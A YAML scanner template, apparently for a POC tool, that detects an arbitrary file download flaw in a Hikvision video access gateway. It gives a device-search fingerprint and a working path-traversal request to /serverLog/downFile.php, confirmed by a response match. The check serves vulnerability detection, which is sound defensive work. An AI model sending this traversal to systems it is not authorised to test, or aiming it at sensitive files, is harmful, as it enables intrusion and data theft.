name: Hikvision_Video_Encoding_Device_Access_Gateway_Any_File_Download
transport: http
set: {}
detail:
  dock: app="Hikvision-Video-coding-device-access-gateway" || title="视频编码设备接入网关"
  product: Hikvision Video coding equipment
  homepage: https://www.hikvision.com/
  impact: Hikvision video access gateway system in page /serverlog/downFile.php There
    is an arbitrary file download vulnerability in the parameter filename of.
  description: Hikvision is a world leading IoT solution provider with video as its
    core competency.
rules:
  r1:
    method: GET
    path: /serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php
    follow_redirects: true
    expression: response.status == 200 && response.body.bcontains(b'$file_name=')
expression: r1()
